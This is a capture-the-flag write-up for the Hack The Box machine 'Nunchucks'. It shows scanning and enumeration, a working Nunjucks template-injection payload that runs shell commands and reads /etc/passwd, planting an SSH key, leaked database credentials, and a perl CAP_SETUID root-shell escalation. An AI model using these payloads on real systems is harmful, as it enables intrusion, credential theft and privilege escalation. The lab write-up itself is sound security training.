---
title: "Hack-the-box writeup Nunchucks"
date: 2023-05-08T15:30:23+02:00
draft: false
tag: ['writeup', 'hack-the-box', 'ctf']
---

This is a write up for the hack-the-box challenge box `Nunchucks`. This time with real commands copy while working at the challenge. Next time we try do do screenshots as well. 

## Finding a attack surface
### Port scan
We once again started with a `nmap` port scan to find open ports and services that can be used to find a attack angle. 

```fish
╰─❯ sudo nmap -sC -sV 10.10.11.122 -Pn

Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-04 14:35 CEST
Stats: 0:00:17 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 14:36 (0:00:06 remaining)
Nmap scan report for 10.10.11.122
Host is up (0.082s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6c146dbb7459c3782e48f511d85b4721 (RSA)
|   256 a2f42c427465a37c26dd497223827271 (ECDSA)
|_  256 e18d44e7216d7c132fea3b8358aa02b3 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://nunchucks.htb/
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg: 
|_  http/1.1
| tls-alpn: 
|_  http/1.1
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Nunchucks - Landing Page
| ssl-cert: Subject: commonName=nunchucks.htb/organizationName=Nunchucks-Certificates/stateOrProvinceName=Dorset/countryName=UK
| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
| Not valid before: 2021-08-30T15:42:24
|_Not valid after:  2031-08-28T15:42:24
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.06 seconds
```
> *Node:* `╰─❯` is used to indicate the command used. Lines following the command are the repose.

We found the following open services and ports that are interesting: `ssh:22`, `hhtp:80`, `ssl:443`. Also noteble is the fact that the `http`website redirects to `https://nunchucks.htb/`. 

### Web enumeration
Following this link directs us to a beautiful and completely random website. After a quick read we declared this website as useless. Most links are dead and the rest is only facade. 

Next we used `gobuster` to enumerate possible subdirectories of the website
```fish
gobuster dir --url https://nunchucks.htb/
```
This did not respond with a good answer so after a while we canceled the process.
Meanwhile we started a search for subdomains. And indeed we found the subdomain `store.nuckus.htb` by running gobuster in `vhost` mode:

```fish
╰─❯ gobuster vhost -w /home/tim/pentest-library/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u https://nunchucks.htb/ -k --append-domain
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             https://nunchucks.htb/
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /home/tim/pentest-library/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/05/04 14:48:19 Starting gobuster in VHOST enumeration mode
===============================================================
Found: store.nunchucks.htb Status: 200 [Size: 4029]
```
> *Note:* running gobuster in `dns` mode did not work. Even if `dns` mode is the intended mode for subdomain search. 

Next we added the subdomain to our `/etc/hosts`. 
```fish
echo "10.10.11.122 nunchucks.htb \n 10.10.11.122 store.nunchucks.htb" > /etc/hosts
```
Visiting the website we where greeted by an other page that offers a form to enter an email to get information about a nunchucks store that will open soon. Suspiciously the website presented a string containing the entered email address after submitting. So we tried to enter a SSTI-string but the website checked if the entered string was a legit email address... client sided. 


## Sever sided template injection (SSTI)

Using `burpsuit` we intercepted the web form and tried to inject some SSTI-packages. `{{7*7}}` is a good way to test for SSTI and indeed the website returned that our email address is `49`. We can deduct that this page is vulnerable to SSTI. 

Next we needed to guess the used engine, as this box is named Nunchucks and there is a template engine named NUNJUCKS it seams as a quit good guess. 
So we changed our "email" to a NUNJUCKS SSTI exploit string that should execute `tail /etc/passwd` 
```fish
POST /api/submit HTTP/1.1
Host: store.nunchucks.htb
Cookie: _csrf=QXBvLF8usqF663WVVx8AwZAX
Content-Length: 127
Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"
Sec-Ch-Ua-Platform: "Linux"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://store.nunchucks.htb
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://store.nunchucks.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

{"email":"{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()}}"}
```

and there response is:
```fish
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 04 May 2023 13:08:28 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 744
Connection: close
X-Powered-By: Express
ETag: W/"2e8-J+TpLegq6Ei0sr/u8xxp/hXEqcY"

{"response":"You will receive updates on the following email address: lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\nrtkit:x:113:117:RealtimeKit,,,:/proc:/usr/sbin/nologin\ndnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\ngeoclue:x:115:120::/var/lib/geoclue:/usr/sbin/nologin\navahi:x:116:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin\ncups-pk-helper:x:117:123:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin\nsaned:x:118:124::/var/lib/saned:/usr/sbin/nologin\ncolord:x:119:125:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin\npulse:x:120:126:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin\nmysql:x:121:128:MySQL Server,,,:/nonexistent:/bin/false\n."}
```
looks good.

### Receiving the user flag
Next we started copying our own sshkey to the known hosts. Therefore we executed the following commands though the before mentioned exploit. 
```fish
mkdir ~/.shh
echo $SSHKEY > ~/.shh/authorized_keys
```

and sshed form our attacker machine into the victim's system as the user david. 
```fish
ssh david@10.10.11.122
```
> *Note:* the user david can be found in the response of the first exploit.

getting the user flag is easy for this point on.


## Privilege escalation
After gathering the user flag we now try to own the machine by opening the root flag. 

### searching for the SETUID-bit
Next we started searching for programs using the SETUID-bit to execute commands as root. 

```fish
david@nunchucks:~$ find / -perm /u=s 2>/dev/null

/usr/bin/fusermount
/usr/bin/umount
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/at
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/su
/usr/bin/sudo
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pppd
```
Interesting, but nothing from it seems to be harmful or miss configured at first sight. 

By the way we also found the credentials for the sql database in the `controllers/routs.js`:
```fish
var mysql      = require('mysql');
var connection = mysql.createConnection({
  host     : 'localhost',
  user     : 'newsletter_admin',
  password : 'StoreNLetters2021',
  database : 'newsletters'
});
```
At this point we got stuck fo a bit as the programs with SETUID-bit where not that helpful.

### Using `linpees.sh` to find the vulnerability

So we tried using [`linpees.sh`](`https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS`). Its a collection of scripts searching for possible privilege escalation vectors. 
We downloaded it form the [git](https://github.com/carlospolop/PEASS-ng/releases/) and transferred it with a mini http sever to the victim's machine. 
```fish
htb@attacker:
╰─❯ curl https://github.com/carlospolop/PEASS-ng/releases/tag/20230425-bd7331ea/linpeas.sh -o linpeas.sh
╰─❯ python3 -m http.server 8000 

-----------------------------------------------------------------------------

david@nunchucks:
╰─❯ curl http://10.10.16.3:8000/linpeas.sh -o linpeas.sh
```

Utilizing `linpeas.sh` we found out that `perl` was running with `CAP_SETUID` capability set. Using [GTFOBins](https://gtfobins.github.io/) we figured out that this could lead to a privilage escaplation.  
> *Note:* Afterwards we found out that using 
> ```fish
> getcap -r / 2>/dev/null
> ```
> would have also worked. Listing all files with special capabilities. As we already thought about `CAP_SETUID`.

Nethertheless as we simply tried to run the expolid command surgested at [GTFOBins](https://gtfobins.github.io/) we revived nothing.
```fish
./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
``` 
However running the same as a little scrip worked, enabling us to enter a root shell. Tada!
```perl
#!/usr/bin/perl
use POSIX (setuid);
POSIX::setuid(0);
exec "/bin/bash";
```
> *Note:* We did not find out why it was behaving like this during our hacking session, but after reading in the documentation while doing a recap, it seem that AppArmor was blocking us and got confused with the shebang. 

With the root flag in hand we than finisehd this box.
## **Pwded**
